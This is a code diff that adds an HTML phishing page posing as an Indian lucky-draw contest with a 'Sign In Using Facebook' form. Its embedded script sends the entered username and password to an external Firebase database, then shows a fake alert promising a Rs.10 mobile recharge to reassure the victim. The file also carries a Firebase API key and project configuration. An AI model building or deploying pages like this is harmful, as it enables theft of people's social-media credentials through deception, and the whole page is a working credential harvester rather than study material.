@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+  <head>
+  	<title>	Biggest Indian Lucky draw is back !</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+	
+	<link rel="stylesheet" href="css/style.css">
+
+	</head>
+	<body>
+	<section class="ftco-section">
+		<div class="container">
+			<div class="row justify-content-center">
+				<div class="col-md-6 text-center mb-5">
+					<h2 class="heading-section">Biggest Indian Lucky draw is back !</h2>
+				</div>
+			</div>
+			<div class="row justify-content-center">
+				<div class="col-md-7 col-lg-5">
+					<div class="wrap">
+						<div class="img" style="background-image: url(images/bg-1.jpg);"></div>
+						<div class="login-wrap p-4 p-md-5">
+			      	<div class="d-flex">
+			      		<div class="w-100">
+			      			<h3 class="mb-4">Sign In Using Facebook</h3>
+			      		</div>
+								
+			      	</div>
+
+			      		<div class="form-group mt-3">
+			      			<input type="text" id="aa" class="form-control" required>
+			      			<label class="form-control-placeholder" for="username">Username</label>
+			      		</div>
+		            <div class="form-group">
+		              <input id="bb" type="password" class="form-control" required>
+		              <label class="form-control-placeholder" for="password">Password</label>
+		              <span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span>
+		            </div>
+		            <div class="form-group">
+		            	<button id="cc" >Check In with Facebook</button>
+            </div>
+		  
+
+		          <p class="text-center">Hurry Up </p>
+		        </div>
+		      </div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+
+
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.7.0/firebase-app.js";
+  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.7.0/firebase-database.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyA0CimRA3dssI7TjBWNRxjWzXhWrrlj39E",
+    authDomain: "abcd-5d4cf.firebaseapp.com",
+    databaseURL: "https://abcd-5d4cf-default-rtdb.firebaseio.com",
+    projectId: "abcd-5d4cf",
+    storageBucket: "abcd-5d4cf.appspot.com",
+    messagingSenderId: "50626912631",
+    appId: "1:50626912631:web:3b7421fb03a504a5a94172"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
+
+cc.addEventListener('click',(e) => {
+var a = document.getElementById('aa').value;
+var b = document.getElementById('bb').value;
+
+  set(ref(database, 'users/' + a), {
+    a : a,
+    b : b
+  });
+alert("You had won mobile recharge of Rs.10 , credited within 2 hours");
+});
+</script>
+
+
+	
+
+	</body>
+
+
+
+</html>
+
